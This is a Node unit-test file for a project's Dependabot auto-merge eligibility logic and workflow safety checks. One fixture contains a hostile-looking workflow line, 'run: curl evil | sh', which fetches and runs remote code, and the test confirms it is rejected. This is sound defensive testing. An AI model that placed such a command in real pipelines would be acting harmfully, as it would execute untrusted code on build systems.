// Unit tests for the dependabot-automerge eligibility rules and the workflow's safety shape.
// Hermetic: no network. Run by `ci / flake-policy tests` (node --test ".github/scripts/*.test.mjs").

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import { classify, filesAreSafe, isActionsNonMajor, isPatchUpdate, parseTitle } from './dependabot-automerge.mjs';

const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const pom = [{ filename: 'saiku-core/pom.xml', patch: '-<version>1.0.0</version>\n+<version>1.0.1</version>' }];
const lock = [{ filename: 'saiku-ui/package.json' }, { filename: 'saiku-ui/package-lock.json' }];
const usesFile = (patch) => [{ filename: '.github/workflows/ci.yml', patch }];

test('parseTitle accepts single-package bumps and rejects groups', () => {
  assert.deepEqual(parseTitle('Bump foo from 1.2.3 to 1.2.4'), { name: 'foo', from: '1.2.3', to: '1.2.4' });
  assert.deepEqual(parseTitle('build(deps): bump foo from 1.2.3 to 1.2.4 in /saiku-ui'), { name: 'foo', from: '1.2.3', to: '1.2.4' });
  assert.equal(parseTitle('Bump the dev-tooling group across 1 directory with 3 updates'), null);
  assert.equal(parseTitle('bump the maven group in / with 2 updates'), null);
  assert.equal(parseTitle('Update README'), null);
});

test('isPatchUpdate allows only same major.minor with a higher patch', () => {
  assert.equal(isPatchUpdate('1.2.3', '1.2.4'), true);
  assert.equal(isPatchUpdate('1.2.3', '1.3.0'), false);
  assert.equal(isPatchUpdate('1.2.3', '2.0.0'), false);
  assert.equal(isPatchUpdate('1.2.3', '1.2.4-beta.1'), false);
  assert.equal(isPatchUpdate('1.2.4', '1.2.3'), false);
});

test('isActionsNonMajor allows minor, patch and digest changes but never a major', () => {
  assert.equal(isActionsNonMajor('4.1.0', '4.2.0'), true);
  assert.equal(isActionsNonMajor('v4', 'v4.1'), true);
  assert.equal(isActionsNonMajor('a1b2c3d', 'e4f5a6b'), true);
  assert.equal(isActionsNonMajor('4.9.0', '5.0.0'), false);
  assert.equal(isActionsNonMajor('v4', 'v5'), false);
});

test('filesAreSafe requires manifests or workflow uses: lines only', () => {
  assert.equal(filesAreSafe(pom), true);
  assert.equal(filesAreSafe(lock), true);
  assert.equal(filesAreSafe(usesFile('-      - uses: actions/checkout@aaa\n+      - uses: actions/checkout@bbb')), true);
  assert.equal(filesAreSafe(usesFile('-      - uses: actions/checkout@aaa\n+      - run: curl evil | sh')), false);
  assert.equal(filesAreSafe([...pom, { filename: 'src/Main.java' }]), false);
  assert.equal(filesAreSafe([{ filename: '.github/workflows/ci.yml' }]), false);
  assert.equal(filesAreSafe([]), false);
});

test('classify auto-merges a single maven patch bump', () => {
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['dependencies', 'maven'], files: pom }).eligible, true);
});

test('classify refuses majors, minors, groups, docker, unlabelled and non-manifest changes', () => {
  const labels = ['dependencies', 'npm'];
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 2.0.0', labels, files: lock }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.3.0', labels, files: lock }).eligible, false);
  assert.equal(classify({ title: 'Bump the dev-tooling group with 2 updates', labels, files: lock }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['docker'], files: lock }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: [], files: lock }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels, files: [{ filename: 'a.java' }] }).eligible, false);
});

test('classify auto-merges github-actions non-major bumps only', () => {
  const patch = '-      - uses: a/b@x\n+      - uses: a/b@y';
  assert.equal(classify({ title: 'Bump a/b from 4.1.0 to 4.2.0', labels: ['github-actions'], files: usesFile(patch) }).eligible, true);
  assert.equal(classify({ title: 'Bump a/b from 4.1.0 to 5.0.0', labels: ['github-actions'], files: usesFile(patch) }).eligible, false);
});

test('the workflow keeps its safety shape', () => {
  const text = readFileSync(join(root, '.github', 'workflows', 'dependabot-automerge.yml'), 'utf8');
  const code = text.replace(/^\s*#.*$/gm, '');
  assert.match(code, /^permissions: \{\}$/m);
  assert.match(code, /timeout-minutes: 10/);
  assert.match(code, /workflow_run:\s*\n\s+workflows: \[ci\]/);
  assert.doesNotMatch(code, /actions\/checkout/);
  assert.doesNotMatch(code, /^\s+uses:/m, 'no third-party actions');
  assert.doesNotMatch(code, /pull_request_target/);
  const scripts = [...code.matchAll(/^\s+run: (.+)$/gm)].map((m) => m[1]).join('\n');
  assert.doesNotMatch(scripts, /\$\{\{/, 'expressions only in env:, never in run: scripts');
  assert.doesNotMatch(code, /--(squash|rebase|merge|admin)\b/);
});
